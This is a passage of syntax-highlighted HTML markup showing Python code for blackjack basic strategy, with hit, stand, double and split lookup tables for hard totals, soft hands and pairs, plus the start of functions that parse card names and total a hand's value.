style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'hit'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'stand'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'double'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'split'\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">PLAYER_TOTAL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#   2       3       4       5       6       7       8       9       10      A\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 3\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 4\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 5\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 6\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 7\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      H,      H,      H,      H,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 8\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      D,      D,      D,      D,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 9\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   D,      D,      D,      D,      D,      D,      D,      D,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 10\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   D,      D,      D,      D,      D,      D,      D,      D,      D,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 11\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      H,      S,      S,      S,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 12\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 13\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 14\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 15\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   S,      S,      S,      S,      S,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 16\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 17\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 18\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 19\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 20\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">HANDS_WITH_ACE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#   2       3       4       5       6       7       8       9       10      A\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      H,      H,      D,      D,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># A2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      H,      H,      D,      D,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># A3\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      H,      D,      D,      D,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># A4\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      H,      D,      D,      D,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># A5\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      D,      D,      D,      D,      H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># A6\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   S,      D,      D,      D,      D,      S,      S,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># A7\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># A8\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># A9\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">PAIR\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#99A0A6\">#   2       3       4       5       6       7       8       9       10      A\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 2,2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 3,3\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   H,      H,      H,      \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 4,4\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   D,      D,      D,      D,      D,      D,      D,      D,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 5,5\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     H,      H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 6,6\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     H,      H,      H,      H   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 7,7\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">  ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 8,8\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     S,      \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     S,      S   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 9,9\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   S,      S,      S,      S,      S,      S,      S,      S,      S,      S   ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># 10,10\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[   \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,     \u003C/span>\u003Cspan style=\"--0:#79B8FF\">SP\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">  ],  \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># A,A\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> re\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">extract_cards_from_string\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(s):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">extract \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">r\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\b(\\w\u003C/span>\u003Cspan style=\"--0:#F97583\">+|\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\d\u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#79B8FF\">)\\s\u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#DBEDFF\">of\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> re.findall(extract, s)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">get_value\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(cards):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">value \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">aces \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> card \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> cards:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> card.isnumeric():\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">value \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">int\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(card)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> card \u003C/span>\u003Cspan style=\"--0:#F97583\">==\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'Ace'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">aces \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">value \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan 